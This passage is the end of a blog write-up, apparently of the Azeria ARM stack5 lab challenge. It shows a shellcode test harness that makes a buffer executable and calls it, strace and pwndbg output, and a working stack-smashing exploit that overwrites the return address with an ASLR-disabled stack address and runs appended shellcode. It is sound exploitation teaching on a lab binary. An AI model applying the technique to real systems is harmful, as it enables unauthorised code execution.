+<span class="w">    </span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">fsize</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">fsize</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buf</span><span class="p">)();</span><span class="w"></span>
+</code></pre></div>
+
+<p>This is an example:</p>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ ./test-egg egg.text
+Egg loaded at 0x24000-0x2409
+</code></pre></div>
+
+<p><label for='ClRoZSBgZ29vZGAgYW5kIGBiYWRgIGxhYmVscyB3ZXJlIHB1dCBieSBtZS4gU29ycnksIGBzdHJhY2Vgey5jcHB9IGlzIG5vdCBzbyBzbWFydC4KbWFyZ2lubm90ZXM=' class='margin-toggle'> &#8853;</label>
+<input type='checkbox' id='ClRoZSBgZ29vZGAgYW5kIGBiYWRgIGxhYmVscyB3ZXJlIHB1dCBieSBtZS4gU29ycnksIGBzdHJhY2Vgey5jcHB9IGlzIG5vdCBzbyBzbWFydC4KbWFyZ2lubm90ZXM=' class='margin-toggle'/>
+<span class='marginnote'>
+The <code><span class="highlight-candombe-inline"><span class="nf">good</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">bad</span><span class="w"></span></span></code> labels were put by me. Sorry, <code><span class="highlight-candombe-inline"><span class="n">strace</span><span class="w"></span></span></code> is not so smart.
+</span></p>
+<p>If the things don’t result as expected, <code><span class="highlight-candombe-inline"><span class="n">strace</span><span class="w"></span></span></code> can be useful to inspect what syscalls are being called and with which parameters:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">pi</span><span class="nd">@raspberrypi</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strace</span> <span class="o">-</span><span class="n">i</span> <span class="o">./</span><span class="n">test</span><span class="o">-</span><span class="n">egg</span> <span class="n">egg</span><span class="o">.</span><span class="n">text</span>
+<span class="o">....</span>
+<span class="n">strace</span><span class="p">:</span> <span class="n">Process</span> <span class="mi">4959</span> <span class="n">attached</span> <span class="o">&lt;---</span> <span class="n">child</span> <span class="n">process</span>
+<span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x6e69622f</span><span class="p">,</span> <span class="o">...</span><span class="p">,</span> <span class="mh">0x666f</span><span class="p">],</span> <span class="mh">0x2407f</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EFAULT</span> <span class="p">(</span><span class="n">Bad</span> <span class="n">address</span><span class="p">)</span>
+           <span class="o">^</span>            <span class="o">^</span>
+         <span class="n">good</span>          <span class="n">bad</span>
+</code></pre></div>
+
+<h2 id="search-a-home">Search a home</h2>
+<p>Fortunately the stack is executable:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">vmmap</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10000</span><span class="w">    </span><span class="mh">0x11000</span><span class="w"> </span><span class="nv">r</span><span class="o">-</span><span class="nv">xp</span><span class="w">     </span><span class="mi">1000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">pi</span><span class="o">/</span><span class="nv">stack5</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x20000</span><span class="w">    </span><span class="mh">0x21000</span><span class="w"> </span><span class="nv">rwxp</span><span class="w">     </span><span class="mi">1000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">pi</span><span class="o">/</span><span class="nv">stack5</span><span class="w"></span>
+<span class="err">0</span><span class="nf">xb6fcc000</span><span class="w"> </span><span class="mh">0xb6fec000</span><span class="w"> </span><span class="nv">r</span><span class="o">-</span><span class="nv">xp</span><span class="w">    </span><span class="mi">20000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">arm</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnueabihf</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mf">2.28</span><span class="nv">.so</span><span class="w"></span>
+<span class="err">0</span><span class="nf">xb6ffc000</span><span class="w"> </span><span class="mh">0xb6ffe000</span><span class="w"> </span><span class="nv">rwxp</span><span class="w">     </span><span class="mi">2000</span><span class="w"> </span><span class="mi">20000</span><span class="w">  </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">arm</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnueabihf</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mf">2.28</span><span class="nv">.so</span><span class="w"></span>
+<span class="err">0</span><span class="nf">xb6fff000</span><span class="w"> </span><span class="mh">0xb7000000</span><span class="w"> </span><span class="nv">r</span><span class="o">-</span><span class="nv">xp</span><span class="w">     </span><span class="mi">1000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="p">[</span><span class="nv">sigpage</span><span class="p">]</span><span class="w"></span>
+<span class="err">0</span><span class="nf">xbefdf000</span><span class="w"> </span><span class="mh">0xbf000000</span><span class="w"> </span><span class="nv">rwxp</span><span class="w">    </span><span class="mi">21000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="p">[</span><span class="nv">stack</span><span class="p">]</span><span class="w"></span>
+<span class="err">0</span><span class="nf">xffff0000</span><span class="w"> </span><span class="mh">0xffff1000</span><span class="w"> </span><span class="nv">r</span><span class="o">-</span><span class="nv">xp</span><span class="w">     </span><span class="mi">1000</span><span class="w"> </span><span class="mi">0</span><span class="w">      </span><span class="p">[</span><span class="nv">vectors</span><span class="p">]</span><span class="w"></span>
+</code></pre></div>
+
+<p>We can write the egg in the stack and then jump to it. The content of the stack should be:</p>
+<p><figure><figcaption><span markdown='1'>
+<pre data-input_format="markdown" data-output_format="plain-block"><code></code></pre>
+</span></figcaption>
+<object  class='' align='middle' data='/img/arm/azeria-arm-challenges/stack.svg' type='image/svg+xml'></object></figure></p>
+<p><code><span class="highlight-candombe-inline"><span class="n">addr1</span><span class="w"></span></span></code> is <code><span class="highlight-candombe-inline"><span class="nf">sp</span><span class="w"></span></span></code>. But what value is?</p>
+<p>If we disable ASLR we can peek the value with a debugger: 0xbefffbb8</p>
+<h2 id="the-attack">The attack</h2>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ <span class="nb">echo</span> -ne <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\xfb\xff\xbe&#39;</span> &gt; exploit
+pi@raspberrypi:~$ cat egg.text &gt;&gt; exploit
+
+pi@raspberrypi:~$ rm -f pwned_proof
+
+pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ cat exploit <span class="p">|</span> ./stack5
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ <span class="nb">echo</span> <span class="nv">$?</span>
+<span class="m">0</span>
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ cat pwned_proof
+pwn!
+</code></pre></div>
+
+<p>The assembly of the egg can be found <a href="/assets/arm/azeria-arm-challenges/egg.s">here</a>.</p>
+<h2 id="readings">Readings</h2>
+<ul>
+<li><p><a href="https://web.archive.org/web/2020*/http://www.phrack.org/issues/58/10.html#article">Developing StrongARM/Linux shellcode</a></p></li>
+<li><p><a href="https://azeria-labs.com/return-oriented-programming-arm32/">Introduction to ROP on Arm32</a></p></li>
+<li><p><a href="https://azeria-labs.com/writing-arm-shellcode/">Introduction to Writing ARM Shellcode</a></p>
+</article>
+<span class="print-footer">Smashing ARM Stack for Fun - Part VI - January 26, 2021 - Martin Di Paola</span>
+<footer>
+<hr class="slender">
+<div class="credits">
+    <span>&copy;
+        Martin Di Paola
+    </span></br>
+        <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+        <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+    <br>
+
+    <a href="mailto:martinp.dipaola@gmail.com">martinp.dipaola@gmail.com</a></span></br> <br>
+
+</div>
+</footer></li>
+</ul>
+</body>
+</html>
